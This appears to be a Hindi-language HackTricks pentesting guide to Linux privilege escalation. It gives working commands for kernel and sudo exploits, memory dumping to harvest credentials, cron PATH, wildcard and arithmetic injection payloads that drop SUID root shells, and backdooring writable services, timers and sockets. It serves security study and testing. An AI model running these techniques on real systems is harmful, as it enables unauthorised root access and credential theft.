# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी एकत्र करना शुरू करते हैं
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` के अंदर किसी भी फ़ोल्डर पर लिखने की अनुमति रखते हैं** वेरिएबल, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version की जाँच करें और देखें कि कोई exploit है जो escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel list और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits खोजने में मदद करने वाले tools:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **kernel version को Google में खोजें**, शायद आपकी kernel version किसी kernel exploit में लिखी हुई हो और तब आप सुनिश्चित हो जाएंगे कि यह exploit वैध है।

अतिरिक्त kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो नीचे दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के वर्शन (**1.9.14 - 1.9.17 < 1.9.17p1**) अनधिकृत स्थानीय उपयोगकर्ताओं को sudo `--chroot` विकल्प के जरिए अपनी विशेषाधिकारों को root तक बढ़ाकर escalate करने की अनुमति देते हैं, जब `/etc/nsswitch.conf` फ़ाइल किसी user-controlled निर्देशिका से उपयोग की जाती है।

यहाँ उस [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) की लिंक है जो उस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए है। Exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और यह `chroot` feature को सपोर्ट करता है।

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg हस्ताक्षर सत्यापन विफल

यह देखने के लिए कि इस vuln का कैसे शोषण किया जा सकता है, **smasher2 box of HTB** में दिए गए **उदाहरण** को देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### और सिस्टम enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं, तो आप उससे escape करने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी के लिए जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **any compiler is installed**. यह उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना पड़े, क्योंकि अनुशंसा की जाती है कि आप इसे उसी machine पर (या किसी समान machine पर) compile करें जहाँ आप इसका उपयोग करने वाले हैं।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

इंस्टॉल किए गए पैकेजों और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) मौजूद हो जो escalating privileges के लिए exploited हो सके…\
संदिग्ध रूप से इंस्टॉल किए गए सॉफ़्टवेयर के संस्करणों की मैन्युअल जाँच करने की सिफारिश की जाती है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है, तो आप मशीन में स्थापित पुराने और vulnerable सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएँगे जो अधिकतर बेकार होगी, इसलिए OpenVAS या इसी तरह के किसी टूल का उपयोग करने की सलाह दी जाती है जो यह जाँच सके कि कोई स्थापित सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable तो नहीं है_

## Processes

देखें कि **कौन से processes** चल रहे हैं और जाँचें कि क्या किसी process के पास **उसे मिलनी चाहिए उससे अधिक privileges** तो नहीं हैं (उदाहरण के लिए, tomcat को root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा यह जाँचें कि कोई [**electron/cef/chromium debuggers** चल रहे हैं — जिन्हें आप privileges escalate करने के लिए abuse कर सकते हैं](electron-cef-chromium-debugger-abuse.md)। **Linpeas** इनको process की command line में `--inspect` parameter देखकर detect करता है।\
साथ ही प्रोसेस की binaries पर अपनी privileges भी चेक करें — हो सकता है आप किसी का overwrite कर सकें।

### Process monitoring

आप processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे टूल्स का उपयोग कर सकते हैं। यह उन vulnerable processes को पहचानने में बहुत उपयोगी हो सकता है जो बार-बार execute होते हैं या जब कुछ शर्तें पूरी होती हैं।

### Process memory

कुछ सर्विसेस सर्वर की memory के अंदर **credentials in clear text inside the memory** save कर देती हैं।\
आम तौर पर दूसरों के processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होती है, इसलिए यह आमतौर पर तब ज्यादा उपयोगी होता है जब आप पहले से root हैं और आगे के credentials खोजने चाहते हैं।\
हालाँकि, ध्यान रहे कि **as a regular user you can read the memory of the processes you own**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश मशीनें डिफ़ॉल्ट रूप से **ptrace allow नहीं करतीं**, जिसका अर्थ है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid समान हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को ही debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को पुनः सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है तो आप Heap निकालकर उसके credentials के अंदर खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाते हैं कि मेमोरी उस प्रोसेस के वर्चुअल एड्रेस स्पेस के भीतर कैसे मैप की गई है**; यह **प्रत्येक मैप किए गए क्षेत्र की अनुमतियाँ** भी दिखाता है।  
**mem** pseudo फ़ाइल **प्रोसेस की मेमोरी को स्वयं उजागर करती है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **मेमोरी क्षेत्र पठनीय हैं** और उनके offsets। हम इस जानकारी का उपयोग करके **mem फ़ाइल में seek कर सभी पठनीय क्षेत्रों को dump** करते हैं और उन्हें एक फ़ाइल में सेव करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच देता है, न कि आभासी मेमोरी। Kernel के आभासी एड्रेस स्पेस तक /dev/kmem का उपयोग करके पहुँचा जा सकता है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ा जा सकता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump linux के लिए

ProcDump, Windows के लिए Sysinternals suite में मौजूद क्लासिक ProcDump tool का Linux के लिए पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

किसी प्रोसेस की मेमोरी को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटाकर आपके द्वारा स्वामित्व वाले प्रोसेस को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### प्रोसेस मेमोरी से क्रेडेंशियल्स

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के sections देखें — एक process की memory को dump करने के विभिन्न तरीकों को जानने के लिए) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से और कुछ **प्रसिद्ध फाइलों** से **सादा-पाठ क्रेडेंशियल्स चुराता है**। इसके ठीक से काम करने के लिए root privileges की आवश्यकता होती है।

| विशेषता                                          | प्रोसेस नाम           |
| ------------------------------------------------ | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)      | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)| gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                         | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                     | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सत्र)            | apache2              |
| OpenSSH (सक्रिय SSH सत्र - Sudo उपयोग)           | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## नियोजित/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – वेब-आधारित शेड्यूलर privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback पर बाइंड है, तो आप इसे SSH local port-forwarding के जरिए भी एक्सेस कर सकते हैं और एक privileged job बनाकर escalate कर सकते हैं।

सामान्य क्रम
- केवल loopback पोर्ट (उदा., 127.0.0.1:8000) और Basic-Auth realm को `ss -ntlp` / `curl -v localhost:8000` के माध्यम से खोजें
- ऑपरेशनल artifacts में credentials खोजें:
- Backups/scripts जिनमें `zip -P <password>`
- systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` प्रकट करता है
- टनल करें और लॉगिन करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित user और न्यूनतम permissions के साथ सीमित करें
- localhost पर bind करें और अतिरिक्त रूप से access को firewall/VPN के माध्यम से प्रतिबंधित करें; passwords का पुन: उपयोग न करें
- unit files में secrets एम्बेड न करें; secret stores या केवल root वाले EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्रिय करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप उस script का फायदा उठा सकते हैं जिसे root द्वारा execute किया जा रहा है (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिन्हें root उपयोग करता है? symlinks का उपयोग करें? उस directory में specific files create करें जो root उपयोग करता है?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab में root उपयोगकर्ता बिना PATH सेट किए कोई कमांड या स्क्रिप्ट निष्पादित करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
फिर, आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि किसी script को root द्वारा चलाया जाता है और किसी command के भीतर “**\***” हो, तो आप इसका फायदा उठाकर अप्रत्याशित चीज़ें कर सकते हैं (जैसे privesc). उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**अगर wildcard किसी path जैसे** _**/some/path/**_ **से पहले आता है, तो यह कमजोर नहीं है (यहाँ तक कि** _**./***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. यदि कोई root cron/parser untrusted log fields पढ़ता है और उन्हें किसी arithmetic context में फीड करता है, तो एक attacker एक command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute हो जाता है।

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. इसलिए एक value जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute होती है (command चल जाते हैं), और फिर शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि script बिना errors के आगे बढ़े।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled text लिखवाइए ताकि numeric-looking field में एक command substitution हो और वह एक digit पर समाप्त हो। सुनिश्चित करें कि आपका command stdout पर कुछ न प्रिंट करे (या उसे redirect कर दें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसे **directory का उपयोग करता है जिस पर आपकी पूरी पहुँच है**, तो उस फ़ोल्डर को हटाकर और आपकी नियंत्रित script को serve करने वाले किसी अन्य स्थान की ओर **symlink फ़ोल्डर बनाने** से मदद मिल सकती है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries जिनके पास writable payloads हों
Blue teams कभी-कभी cron-driven बाइनरीज को "sign" करते हैं — एक custom ELF सेक्शन dump करके और किसी vendor string के लिए grep करके — और फिर उन्हें root के रूप में execute करने से पहले वेरिफाई करते हैं। अगर वह बाइनरी group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका owner `root:devs 770` है) और आप signing material leak कर सकते हैं, तो आप उस सेक्शन को forge करके cron task hijack कर सकते हैं:

1. `pspy` का उपयोग करके verification flow कैप्चर करें। In Era, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर फाइल को execute किया।
2. leaked key/config (from `signing.zip`) का उपयोग करके expected certificate फिर से बनाएँ:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएँ (उदा., SUID bash drop करें, अपना SSH key जोड़ें) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits को बनाए रखते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगली cron run का इंतजार करें; जैसे ही naive signature check सफल हो जाता है, आपका payload root के रूप में चल जाएगा।

### Frequent cron jobs

आप processes को monitor करके ऐसे processes ढूँढ सकते हैं जो हर 1, 2 या 5 मिनट में execute हो रहे हों। शायद आप इसका फायदा उठा कर privileges escalate कर सकें।

उदाहरण के लिए, 1 मिनट के दौरान **हर 0.1s पर monitor करने के लिए**, **कम से कम executed commands के अनुसार sort करने** और सबसे अधिक executed commands को हटाने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका उपयोग भी कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली प्रत्येक process को मॉनिटर करेगा और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि cronjob **comment के बाद एक carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं, तो आप इसे **संशोधित कर सकते हैं** ताकि यह **निष्पादित करे** आपका **backdoor जब** service **शुरू**, **पुनः आरंभ** या **रोक** किया जाए (शायद आपको मशीन के reboot होने तक प्रतीक्षा करनी पड़े).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि यदि आपके पास **write permissions over binaries being executed by services** हैं, तो आप उन्हें बदलकर backdoors रख सकते हैं ताकि जब services फिर से execute हों तो backdoors execute हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किया गया PATH निम्न कमांड से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** वाली फ़ाइलों की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर में जिसमें आप लिख सकते हैं, relative path binary के बिल्कुल उसी नाम का एक **executable** बनाइए, और जब service से संवेदनशील क्रिया (**Start**, **Stop**, **Reload**) चलाने के लिए कहा जाएगा, आपका **backdoor** चल जाएगा (unprivileged users आमतौर पर services को start/stop नहीं कर पाते; पर जाँच करें कि आप `sudo -l` चला सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd unit फ़ाइलें हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` फ़ाइलों या इवेंट्स को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए बिल्ट-इन सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को सूचीबद्ध करने के लिए:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी timer को संशोधित कर सकते हैं तो आप उसे systemd.unit के किसी मौजूदा यूनिट (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह वह unit है जिसे इस timer के समाप्त होते ही activate किया जाएगा। तर्क एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर default होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (See above.) अनुशंसा की जाती है कि जिसे activate किया जाने वाला unit नाम और timer unit का unit नाम suffix के अलावा बिल्कुल समान हों।

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **executing a writable binary**
- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **Timer सक्षम करना**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल में एक ही या अलग मशीनों पर **process communication** को सक्षम करते हैं। ये कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं पर सारांश का उपयोग यह **बताने के लिए किया जाता है कि यह किस पर सुनने वाला है** (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए port नंबर, आदि)
- `Accept`: एक boolean argument लेता है। अगर **true** है, तो प्रत्येक आने वाले कनेक्शन के लिए एक **service instance is spawned for each incoming connection** और केवल कनेक्शन socket ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets खुद **passed to the started service unit** होते हैं, और सभी कनेक्शनों के लिए केवल एक service unit स्पॉन होती है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit बिना शर्त सभी आने वाले ट्रैफ़िक को संभालता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons को केवल इस तरह लिखा जाना चाहिए कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के क्रमशः **बनने से पहले** या **बाद** में निष्पादित किया जाता है। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के क्रमशः **बंद** और हटाए जाने से पहले या बाद में निष्पादित होते हैं।
- `Service`: इनकमिंग ट्रैफ़िक पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस service पर सेट है जो socket जैसा ही नाम रखती है (सफलिक्स बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
